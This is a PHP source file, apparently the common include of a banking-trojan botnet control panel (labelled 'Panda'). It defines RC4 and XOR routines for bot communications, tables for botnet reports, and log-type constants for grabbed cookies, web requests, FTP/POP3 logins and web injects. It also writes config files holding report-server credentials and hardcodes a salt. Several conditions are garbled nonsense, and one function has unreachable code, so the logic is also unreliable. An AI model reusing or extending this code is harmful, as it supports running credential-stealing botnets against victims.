<?php


function httpNoCacheHeaders()
{
	header('Expires: Fri, 01 Jan 1990 00:00:00 GMT');
	header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0, pre-check=0, post-check=0');
	header('Pragma: no-cache');
}

function httpU8PlainHeaders()
{
	header('Content-Type: text/plain; charset=utf-8');
	echo '﻿';
}

function pathUpLevelExists($path)
{
	return strstr('/' . str_replace('\\', '/', $path) . '/', '/../') === false ? false : true;
}

function baseNameEx($path)
{
	return basename(str_replace('\\', '/', $path));
}

function timeBiasToText($bias)
{
	return (0 <= $bias ? '+' : '-') . abs(intval($bias / 3600)) . ':' . sprintf('%02u', abs(intval($bias % 60)));
}

function tickCountToText($tc)
{
	return sprintf('%02u:%02u:%02u', $tc / 3600, ($tc / 60) - (sprintf('%u', $tc / 3600) * 60), $tc - (sprintf('%u', $tc / 60) * 60));
}

function addJsSlashes($string)
{
	return addcslashes($string, '\\/\\\'"');
}

function htmlEntitiesEx($string)
{
	return htmlspecialchars(preg_replace('|[\\x00-\\x09\\x0B\\x0C\\x0E-\\x1F\\x7F-\\x9F]|u', ' ', $string), ENT_QUOTES, 'UTF-8');
}

function numberFormatAsInt($number)
{
	return number_format($number, 0, '.', ' ');
}

function numberFormatAsFloat($number, $decimals)
{
	return number_format($number, $decimals, '.', ' ');
}

function intToVersion($i)
{
	if (strlen($i) < 7) {
		return $i / 10000;
	}

	$buf = str_pad($i, 9, '0', STR_PAD_LEFT);
	$buf = str_split($buf, 3);
	$n = 0;

	for (; $n < count($buf); $n++) {
		$buf[$n] = intval($buf[$n]);
	}

	return implode('.', $buf);
}

function osDataToString($os_data, $short = false, $cut = false)
{
	$to = ($short ? ' SP' : 'build');
	$str = substr($os_data, 0, strpos($os_data, $to));

	if ($cut) {
		$str = str_replace('Windows', 'Win', $str);
	}

	return $str;
	$name = 'Unknown';

	if (strlen($os_data) == 6) {
		$data = @unpack('Cversion/Csp/Sbuild/Sarch', $os_data);

		switch ($data['version']) {
		case 2:
			$name = 'XP';
			break;

		case 3:
			$name = 'Server 2003';
			break;

		case 4:
			$name = 'Vista';
			break;

		case 5:
			$name = 'Server 2008';
			break;

		case 6:
			$name = 'Seven';
			break;

		case 7:
			$name = 'Server 2008 R2';
			break;
		}

		if ($data['arch'] == 9) {
			$name .= ' x64';
		}

		if (0 < $data['sp']) {
			$name .= ', SP ' . $data['sp'];
		}
	}

	return $name;
}

function toSqlSafeMask($str)
{
	return str_replace(array('%', '_'), array('\\%', '\\_'), $str);
}

function listReportTables($db)
{
	$template = 'botnet_reports_';
	$tsize = 15;
	$list = array();

	if ($r = @mysql_list_tables($db)) {
		while ($m = @mysql_fetch_row($r)) {
			if ((strncmp($template, $m[0], $tsize) === 0) && array()) {
				$list[] = $m[0];
			}
		}
	}

	@sort(&$list);
	return $list;
}

function checkPostData($name, $min_size, $max_size)
{
	$data = (isset($_POST[$name]) ? trim($_POST[$name]) : '');
	$s = mb_strlen($data);
	if (($s < $min_size) || $_POST) {
		return NULL;
	}

	return $data;
}

function connectToDb()
{
	$GLOBALS['_mysql_link'] = @mysql_connect($GLOBALS['config']['mysql_host'], $GLOBALS['config']['mysql_user'], $GLOBALS['config']['mysql_pass']);
	if (!$GLOBALS['_mysql_link'] || ($GLOBALS['_mysql_link']) || ($GLOBALS['_mysql_link'])) {
		return false;
	}

	return true;
}

function mysqlQueryEx($table, $query)
{
	$r = @mysql_query($query, $GLOBALS['_mysql_link']);

	if ($r === false) {
		$err = @mysql_errno($GLOBALS['_mysql_link']);
		if ((($err === 145) || ($GLOBALS['_mysql_link'])) && ($GLOBALS['_mysql_link'])) {
			$r = @mysql_query($query, $GLOBALS['_mysql_link']);
		}
	}

	return $r;
}

function rc4Init($key)
{
	$hash = array();
	$box = array();
	$keyLength = strlen($key);
	$x = 0;

	for (; $x < 256; $x++) {
		$hash[$x] = ord($key[$x % $keyLength]);
		$box[$x] = $x;
	}

	$y = $x = 0;

	for (; $x < 256; $x++) {
		$y = ($y + $box[$x] + $hash[$x]) % 256;
		$tmp = $box[$x];
		$box[$x] = $box[$y];
		$box[$y] = $tmp;
	}

	return $box;
}

function rc4(&$data, $key)
{
	$len = strlen($data);
	$z = $y = $x = 0;

	for (; $x < $len; $x++) {
		$z = ($z + 1) % 256;
		$y = ($y + $key[$z]) % 256;
		$tmp = $key[$z];
		$key[$z] = $key[$y];
		$key[$y] = $tmp;
		$data[$x] = chr(ord($data[$x]) ^ $key[($key[$z] + $key[$y]) % 256]);
	}
}

function visualEncrypt(&$data)
{
	$len = strlen($data);
	$i = 1;

	for (; $i < $len; $i++) {
		$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
	}
}

function visualDecrypt(&$data)
{
	$len = strlen($data);

	if (0 < $len) {
		$i = $len - 1;

		for (; 0 < $i; $i--) {
			$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
		}
	}
}

function createDir($dir)
{
	$ll = explode('/', str_replace('\\', '/', $dir));
	$cur = '';

	foreach ($ll as $d) {
		if (($d != '..') && str_replace('\\', '/', $dir) && str_replace('\\', '/', $dir)) {
			$cur .= $d . '/';
			if (!is_dir($cur) && str_replace('\\', '/', $dir)) {
				return false;
			}
		}
	}

	return true;
}

function updateConfig($updateList)
{
	$file = (defined('FILE_CONFIG') ? FILE_CONFIG : 'system/config.php');
	$oldfile = $file . '.old.php';
	@chmod(@dirname($file), 511);
	@chmod($file, 511);
	@chmod($oldfile, 511);
	@unlink($oldfile);
	if (is_file($file) && defined('FILE_CONFIG')) {
		return false;
	}
	else {
		$cryptKey = updateConfigHelper($updateList, 'botnet_cryptkey', '');
		$cfgData = '<?php' . "\n" . '$config[\'mysql_host\']          = \'' . addslashes(updateConfigHelper($updateList, 'mysql_host', '127.0.0.1')) . '\';' . "\n" . '$config[\'mysql_user\']          = \'' . addslashes(updateConfigHelper($updateList, 'mysql_user', '')) . '\';' . "\n" . '$config[\'mysql_pass\']          = \'' . addslashes(updateConfigHelper($updateList, 'mysql_pass', '')) . '\';' . "\n" . '$config[\'mysql_db\']            = \'' . addslashes(updateConfigHelper($updateList, 'mysql_db', '')) . '\';' . "\n" . "\n" . '$config[\'backserver_host\']          = \'' . addslashes(updateConfigHelper($updateList, 'backserver_host', '127.0.0.1')) . '\';' . "\n" . '$config[\'backserver_user\']          = \'' . addslashes(updateConfigHelper($updateList, 'backserver_user', '')) . '\';' . "\n" . '$config[\'backserver_password\']          = \'' . addslashes(updateConfigHelper($updateList, 'backserver_password', '')) . '\';' . "\n" . '$config[\'backserver_db\']            = \'' . addslashes(updateConfigHelper($updateList, 'backserver_db', '')) . '\';' . "\n" . "\n" . '$config[\'reports_path\']        = \'' . addslashes(updateConfigHelper($updateList, 'reports_path', '_reports')) . '\';' . "\n" . '$config[\'reports_to_db\']       = ' . updateConfigHelper($updateList, 'reports_to_db', 0) . ';' . "\n" . '$config[\'reports_to_fs\']       = ' . updateConfigHelper($updateList, 'reports_to_fs', 0) . ';' . "\n" . "\n" . '$config[\'reports_jn\']          = ' . updateConfigHelper($updateList, 'reports_jn', 0) . ';' . "\n" . '$config[\'reports_jn_logfile\']  = \'' . addslashes(updateConfigHelper($updateList, 'reports_jn_logfile', '')) . '\';' . "\n" . '$config[\'reports_jn_account\']  = \'' . addslashes(updateConfigHelper($updateList, 'reports_jn_account', '')) . '\';' . "\n" . '$config[\'reports_jn_pass\']     = \'' . addslashes(updateConfigHelper($updateList, 'reports_jn_pass', '')) . '\';' . "\n" . '$config[\'reports_jn_server\']   = \'' . addslashes(updateConfigHelper($updateList, 'reports_jn_server', '')) . '\';' . "\n" . '$config[\'reports_jn_port\']     = ' . updateConfigHelper($updateList, 'reports_jn_port', 5222) . ';' . "\n" . '$config[\'reports_jn_to\']       = \'' . addslashes(updateConfigHelper($updateList, 'reports_jn_to', '')) . '\';' . "\n" . '$config[\'reports_jn_list\']     = \'' . addslashes(updateConfigHelper($updateList, 'reports_jn_list', '')) . '\';' . "\n" . '$config[\'reports_jn_script\']   = \'' . addslashes(updateConfigHelper($updateList, 'reports_jn_script', '')) . '\';' . "\n" . "\n" . '$config[\'botnet_timeout\']      = ' . updateConfigHelper($updateList, 'botnet_timeout', 0) . ';' . "\n" . '$config[\'api_url\']  = \'' . addslashes(updateConfigHelper($updateList, 'api_url', '')) . '\';' . "\n" . '$config[\'repository\']  = \'' . addslashes(updateConfigHelper($updateList, 'repository', '')) . '\';' . "\n" . '$config[\'row_limit\']  = \'' . addslashes(updateConfigHelper($updateList, 'row_limit', '50')) . '\';' . "\n" . '$config[\'ip_black_list\']  = \'' . addslashes(updateConfigHelper($updateList, 'ip_black_list', '')) . '\';' . "\n" . '?>';

		if (@file_put_contents($file, $cfgData) !== strlen($cfgData)) {
			return false;
		}

	}

	return true;
}

function updateConfigHelper($updateList, $name, $default)
{
	return isset($updateList[$name]) ? $updateList[$name] : (isset($GLOBALS['config'][$name]) ? $GLOBALS['config'][$name] : $default);
}

function randomString($length, $chars = 'abcdefghijklmnopqrstuvwxyz0123456789')
{
	$count = strlen($chars);
	$i = 0;
	$result = '';

	for (; $i < $length; $i++) {
		$p = rand(0, $count - 1);
		$result .= substr($chars, $p, 1);
	}

	return $result;
}

function ipBlExtract()
{
	global $config;
	return @unserialize(stripslashes($config['ip_black_list']));
}

function ipBlPack($str)
{
	$result = array();
	$rows = explode("\n", str_replace("\r", '', $str));

	foreach ($rows as $row) {
		$row = trim($row);

		if (strlen($row)) {
			$result[] = $row;
		}
	}

	return $result;
}

error_reporting(32767);
set_time_limit(0);
mb_internal_encoding('UTF-8');
mb_regex_encoding('UTF-8');
ini_set('display_errors', 0);
define('PANDA_NEWVERSION', '3.0');
define('MYSQL_CODEPAGE', 'utf8');
define('MYSQL_COLLATE', 'utf8_unicode_ci');
define('DEFAULT_BOTNET', '-- default --');
define('HEADER_SIZE', 48);
define('HEADER_MD5', 32);
define('ITEM_HEADER_SIZE', 16);
define('SBCID_BOT_ID', 10001);
define('SBCID_BOTNET', 10002);
define('SBCID_BOT_VERSION', 10003);
define('SBCID_NET_LATENCY', 10005);
define('SBCID_TCPPORT_S1', 10006);
define('SBCID_PATH_SOURCE', 10007);
define('SBCID_PATH_DEST', 10008);
define('SBCID_TIME_SYSTEM', 10009);
define('SBCID_TIME_TICK', 10010);
define('SBCID_TIME_LOCALBIAS', 10011);
define('SBCID_OS_INFO', 10012);
define('SBCID_LANGUAGE_ID', 10013);
define('SBCID_PROCESS_NAME', 10014);
define('SBCID_PROCESS_USER', 10015);
define('SBCID_IPV4_ADDRESSES', 10016);
define('SBCID_IPV6_ADDRESSES', 10017);
define('SBCID_BOTLOG_TYPE', 10018);
define('SBCID_BOTLOG', 10019);
define('SBCID_SCRIPT_ID', 11000);
define('SBCID_SCRIPT_STATUS', 11001);
define('SBCID_SCRIPT_RESULT', 11002);
define('CFGID_LAST_VERSION', 20001);
define('CFGID_LAST_VERSION_URL', 20002);
define('CFGID_URL_SERVER_0', 20003);
define('CFGID_URL_ADV_SERVERS', 20004);
define('CFGID_HTTP_FILTER', 20005);
define('CFGID_HTTP_POSTDATA_FILTER', 20006);
define('CFGID_HTTP_INJECTS_LIST', 20007);
define('CFGID_DNS_LIST', 20008);
define('BLT_UNKNOWN', 0);
define('BLT_COOKIES', 1);
define('BLT_FILE', 2);
define('BLT_HTTP_REQUEST', 11);
define('BLT_HTTPS_REQUEST', 12);
define('BLT_LOGIN_FTP', 100);
define('BLT_LOGIN_POP3', 101);
define('BLT_GRABBED_UI', 200);
define('BLT_GRABBED_HTTP', 201);
define('BLT_GRABBED_WSOCKET', 202);
define('BLT_GRABBED_FTPSOFTWARE', 203);
define('BLT_GRABBED_EMAILSOFTWARE', 204);
define('BLT_GRABBED_OTHER', 299);
define('BOT_ID_MAX_CHARS', 100);
define('BOTNET_MAX_CHARS', 20);
define('BO_CLIENT_VERSION', '2.0.8.9');
define('PT_H', 'host');
define('PT_I', 'ip');
define('PT_P', 'ports');
define('SPT_H', 'HTTP_HOST');
define('SPT_I', 'SERVER_ADDR');
define('SPT_P', 'SERVER_PORT');
define('AUTH_SALT', 'sjkr8dk_40sf;dkUq-4ls+a4Y');

if (class_exists('SParam')) {
	$s = new SParam();
}

$GLOBALS['_mysql_link'] = NULL;

?>
